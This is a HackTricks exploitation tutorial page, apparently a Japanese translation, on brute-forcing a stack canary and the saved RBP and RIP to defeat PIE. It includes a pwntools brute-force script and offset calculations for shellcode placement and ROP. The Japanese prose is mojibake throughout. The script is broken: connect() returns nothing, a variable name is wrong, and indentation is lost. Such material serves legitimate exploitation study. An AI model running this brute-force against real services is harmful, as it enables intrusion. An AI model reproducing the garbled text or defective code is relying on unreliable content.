# BF Addresses in the Stack

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**ã‚«ãƒŠãƒªã‚¢ã¨PIEï¼ˆä½ç½®ç‹¬ç«‹å®Ÿè¡Œå¯èƒ½ãƒ•ã‚¡ã‚¤ãƒ«ï¼‰ã§ä¿è­·ã•ã‚ŒãŸãƒã‚¤ãƒŠãƒªã«ç›´é¢ã—ã¦ã„ã‚‹å ´åˆã€ã“ã‚Œã‚‰ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚**

![](<../../../.gitbook/assets/image (865).png>)

{% hint style="info" %}
**`checksec`** ã¯ã€ãƒã‚¤ãƒŠãƒªãŒã‚«ãƒŠãƒªã‚¢ã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’è¦‹ã¤ã‘ã‚‰ã‚Œãªã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯é™çš„ã«ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã•ã‚Œã¦ãŠã‚Šã€é–¢æ•°ã‚’ç‰¹å®šã§ããªã„ãŸã‚ã§ã™ã€‚\
ãŸã ã—ã€é–¢æ•°å‘¼ã³å‡ºã—ã®æœ€åˆã«ã‚¹ã‚¿ãƒƒã‚¯ã«å€¤ãŒä¿å­˜ã•ã‚Œã¦ãŠã‚Šã€ãã®å€¤ãŒçµ‚äº†å‰ã«ãƒã‚§ãƒƒã‚¯ã•ã‚Œã‚‹ã“ã¨ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã§ã€æ‰‹å‹•ã§æ°—ã¥ãã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

## ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹

**PIEã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«ã¯ã€** **ã„ãã¤ã‹ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒªãƒ¼ã‚¯ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚** ãƒã‚¤ãƒŠãƒªãŒã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒªãƒ¼ã‚¯ã—ã¦ã„ãªã„å ´åˆã€æœ€å–„ã®æ–¹æ³•ã¯ã€**è„†å¼±ãªé–¢æ•°å†…ã®ã‚¹ã‚¿ãƒƒã‚¯ã«ä¿å­˜ã•ã‚ŒãŸRBPã¨RIPã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ã“ã¨ã§ã™ã€‚**\
ãŸã¨ãˆã°ã€ãƒã‚¤ãƒŠãƒªãŒ**ã‚«ãƒŠãƒªã‚¢**ã¨**PIE**ã®ä¸¡æ–¹ã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ã‚«ãƒŠãƒªã‚¢ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—å§‹ã‚ã€ãã®å¾Œã®8ãƒã‚¤ãƒˆï¼ˆx64ï¼‰ãŒä¿å­˜ã•ã‚ŒãŸ**RBP**ã§ã‚ã‚Šã€æ¬¡ã®8ãƒã‚¤ãƒˆãŒä¿å­˜ã•ã‚ŒãŸ**RIP**ã«ãªã‚Šã¾ã™ã€‚

{% hint style="success" %}
ã‚¹ã‚¿ãƒƒã‚¯å†…ã®æˆ»ã‚Šã‚¢ãƒ‰ãƒ¬ã‚¹ã¯ã€ãƒ¡ã‚¤ãƒ³ãƒã‚¤ãƒŠãƒªã‚³ãƒ¼ãƒ‰ã«å±ã—ã¦ã„ã‚‹ã¨è€ƒãˆã‚‰ã‚Œã¦ã„ã¾ã™ã€‚è„†å¼±æ€§ãŒãƒã‚¤ãƒŠãƒªã‚³ãƒ¼ãƒ‰ã«ã‚ã‚‹å ´åˆã€é€šå¸¸ã¯ãã®é€šã‚Šã§ã™ã€‚
{% endhint %}

ãƒã‚¤ãƒŠãƒªã‹ã‚‰RBPã¨RIPã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ã«ã¯ã€æœ‰åŠ¹ãªæ¨æ¸¬ãƒã‚¤ãƒˆãŒæ­£ã—ã„å ´åˆã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ãŒä½•ã‹ã‚’å‡ºåŠ›ã™ã‚‹ã‹ã€å˜ã«ã‚¯ãƒ©ãƒƒã‚·ãƒ¥ã—ãªã„ã“ã¨ã‚’ç¢ºèªã§ãã¾ã™ã€‚ã‚«ãƒŠãƒªã‚¢ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ãŸã‚ã«æä¾›ã•ã‚ŒãŸ**åŒã˜é–¢æ•°**ã‚’ä½¿ç”¨ã—ã¦ã€RBPã¨RIPã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã§ãã¾ã™ï¼š
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
PIEã‚’æ‰“ç ´ã™ã‚‹ãŸã‚ã«å¿…è¦ãªæœ€å¾Œã®ã“ã¨ã¯ã€**æ¼æ´©ã—ãŸ**ã‚¢ãƒ‰ãƒ¬ã‚¹ã‹ã‚‰**æœ‰ç”¨ãªã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’è¨ˆç®—ã™ã‚‹ã“ã¨ã§ã™ï¼š**RBP**ã¨**RIP**ã§ã™ã€‚

**RBP**ã‹ã‚‰ã€**ã‚¹ã‚¿ãƒƒã‚¯ã«ã‚·ã‚§ãƒ«ã‚’æ›¸ãè¾¼ã‚“ã§ã„ã‚‹å ´æ‰€**ã‚’è¨ˆç®—ã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚¹ã‚¿ãƒƒã‚¯å†…ã®æ–‡å­—åˆ—_"/bin/sh\x00"_ã‚’æ›¸ãè¾¼ã‚€å ´æ‰€ã‚’çŸ¥ã‚‹ã®ã«éå¸¸ã«å½¹ç«‹ã¡ã¾ã™ã€‚æ¼æ´©ã—ãŸRBPã¨ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®é–“ã®è·é›¢ã‚’è¨ˆç®—ã™ã‚‹ã«ã¯ã€**RBPã‚’æ¼æ´©ã•ã›ãŸå¾Œã«ãƒ–ãƒ¬ãƒ¼ã‚¯ãƒã‚¤ãƒ³ãƒˆã‚’ç½®ã**ã€**ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ãŒã©ã“ã«ã‚ã‚‹ã‹ã‚’ç¢ºèª**ã™ã‚‹ã ã‘ã§ã™ã€‚æ¬¡ã«ã€ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã¨RBPã®é–“ã®è·é›¢ã‚’è¨ˆç®—ã§ãã¾ã™ï¼š
```python
INI_SHELLCODE = RBP - 1152
```
**RIP**ã‹ã‚‰**PIEãƒã‚¤ãƒŠãƒªã®ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’è¨ˆç®—ã§ãã¾ã™ã€‚ã“ã‚Œã¯**æœ‰åŠ¹ãªROPãƒã‚§ãƒ¼ãƒ³**ã‚’ä½œæˆã™ã‚‹ãŸã‚ã«å¿…è¦ã§ã™ã€‚\
ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¨ˆç®—ã™ã‚‹ã«ã¯ã€`objdump -d vunbinary`ã‚’å®Ÿè¡Œã—ã€æœ€æ–°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’é€†ã‚¢ã‚»ãƒ³ãƒ–ãƒ«ã—ã¦ç¢ºèªã—ã¾ã™ï¼š

![](<../../../.gitbook/assets/image (479).png>)

ã“ã®ä¾‹ã§ã¯ã€ã™ã¹ã¦ã®ã‚³ãƒ¼ãƒ‰ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«**1ãƒã‚¤ãƒˆã¨åŠåˆ†ã ã‘ãŒå¿…è¦**ã§ã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ã“ã®å ´åˆã€ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯**æ¼æ´©ã—ãŸRIPã®æœ€å¾ŒãŒã€Œ000ã€**ã«ãªã‚Šã¾ã™ã€‚ãŸã¨ãˆã°ã€`0x562002970ecf`ãŒæ¼æ´©ã—ãŸå ´åˆã€ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹ã¯`0x562002970000`ã§ã™ã€‚
```python
elf.address = RIP - (RIP & 0xfff)
```
## æ”¹å–„

[**ã“ã®æŠ•ç¨¿ã‹ã‚‰ã®ã„ãã¤ã‹ã®è¦³å¯Ÿ**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#extended-brute-force-leaking)ã«ã‚ˆã‚‹ã¨ã€RBPãŠã‚ˆã³RIPå€¤ã‚’æ¼æ´©ã•ã›ã‚‹éš›ã«ã€ã‚µãƒ¼ãƒãƒ¼ã¯æ­£ã—ã„å€¤ã§ãªã„ã„ãã¤ã‹ã®å€¤ã§ã¯ã‚¯ãƒ©ãƒƒã‚·ãƒ¥ã—ãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã€BFã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯è‰¯ã„å€¤ã‚’å–å¾—ã—ãŸã¨è€ƒãˆã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€**æ­£ç¢ºãªå€¤ã§ãªãã¦ã‚‚ã€ã„ãã¤ã‹ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒãã‚Œã‚’å£Šã•ãªã„å¯èƒ½æ€§ãŒã‚ã‚‹ãŸã‚ã§ã™**ã€‚

ãã®ãƒ–ãƒ­ã‚°æŠ•ç¨¿ã«ã‚ˆã‚‹ã¨ã€ã‚µãƒ¼ãƒãƒ¼ã¸ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã®é–“ã«çŸ­ã„é…å»¶ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ãŒæ¨å¥¨ã•ã‚Œã¦ã„ã¾ã™ã€‚

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
